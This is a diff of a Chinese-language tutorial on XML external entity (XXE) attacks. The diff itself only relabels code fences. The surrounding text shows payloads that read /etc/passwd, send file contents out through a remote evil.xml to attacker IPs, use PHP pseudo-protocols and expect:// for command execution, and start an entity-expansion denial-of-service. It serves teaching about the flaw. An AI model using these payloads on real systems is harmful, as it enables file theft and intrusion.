@@ -21,7 +21,7 @@ tags:
 
 ​	XML文件一般存在三部分，包括XML声明、文档类型定义（DTD）及文档元素。
 
-```
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 // XML声明
 
@@ -59,7 +59,7 @@ tags:
 </note> 
 ```
 
-```
+```xml
 //被引用的note.dtd
 <!ELEMENT note (to,from,heading,body)>
 <!ELEMENT to (#PCDATA)>
@@ -74,7 +74,7 @@ tags:
 
 ​	对于传统的XXE来说，要求有一点，就是攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件。例如提交如下请求：
 
-```
+```xml
 <?xml version="1.0"?><!DOCTYPE data [
 <!ELEMENT data (#ANY)>
 <!ENTITY file SYSTEM "file:///etc/issue">]>
@@ -83,7 +83,7 @@ tags:
 
 ​	如果服务器没有回显，只能使用 OOB(外带数据) 攻击来绕过对基本的 XXE 攻击的限制，这种漏洞也成为Blind XXE漏洞。在进行blind XXE攻击时，将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。例如提交如下请求：
 
-```
+```xml
 <?xml version="1.0"?>  
 <!DOCTYPE ANY[  
 <!ENTITY % file SYSTEM "file:///etc/passwd">  
@@ -96,14 +96,14 @@ tags:
 
 在攻击者的VPS中可起一个web服务，将以下evil.xml保存在该web目录下供远程加载。
 
-```
+```xml
 //evil.xml
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://192.168.199.1/?file=%file;'>">
 ```
 
 ​	实体remote，all，send的引用顺序很重要，首先对remote引用目的是将外部文件evil.xml引入到解释上下文中，然后执行%all，这时会检测到send实体，在root节点中引用send，就可以成功实现数据转发。当然，也直接在DTD中引用send实体，如果在evil.xml中，send是个参数实体的话，即以下方式：
 
-```
+```xml
 <?xml version="1.0"?>  
 <!DOCTYPE ANY[  
 <!ENTITY % file SYSTEM "file:///C:/1.txt">  
@@ -114,7 +114,7 @@ tags:
 ]> 
 ```
 
-```
+```xml
 //evil.xml
 <!ENTITY % all "<!ENTITY % send SYSTEM 'http://192.168.150.1/1.php?file=%file;'>">  
 ```
@@ -123,7 +123,7 @@ tags:
 
 ​	由于多方面因素，现在人们更倾向于使用json来代替xml，当WEB服务使用xml或者json中的一种进行传输时，服务器可能会接收开发人员并未预料到的数据格式。如果服务器上的XML解析器的配置不完善，在json传输的终端可能会遭受XXE攻击。这里我们对比以下两个请求：
 
-```
+```http
 HTTP Request:
 POST /netspi HTTP/1.1
 Host: someserver.netspi.com
@@ -141,7 +141,7 @@ Content-Length: 43
 
 ​	如果Content-Type头被修改为application/xml，客户端会告诉服务器post过去的数据是XML格式的。但如果你实际传过去的不是该格式的话，服务器不会进行解析，并且会报如下的错：
 
-```
+```http
 HTTP Request:
 POST /netspi HTTP/1.1
 Host: someserver.netspi.com
@@ -165,7 +165,7 @@ Content-Length: 127
 
 ​	这里有两种方法，基础的上边有提过，还有一种是通过php的伪协议进行，读取到的内容通过base64解码可查看。
 
-```
+```xml
 //基础
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
@@ -174,7 +174,7 @@ Content-Length: 127
 <foo>&xxe;</foo>
 ```
 
-```
+```xml
 //通过PHP伪协议
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
@@ -193,7 +193,7 @@ Content-Length: 127
 
 ​	 如果目标服务器的PHP安装有expect扩展，则可以进行系统命令执行。
 
-```
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "expect://id" >]>
@@ -211,7 +211,7 @@ Content-Length: 127
 
 ​	通过实体递归的方式耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，造成DOS攻击。
 
-```
+```xml
 <?xml version = "1.0"?>
 <!DOCTYPE lolz [
 <!ENTITY lol "lol">
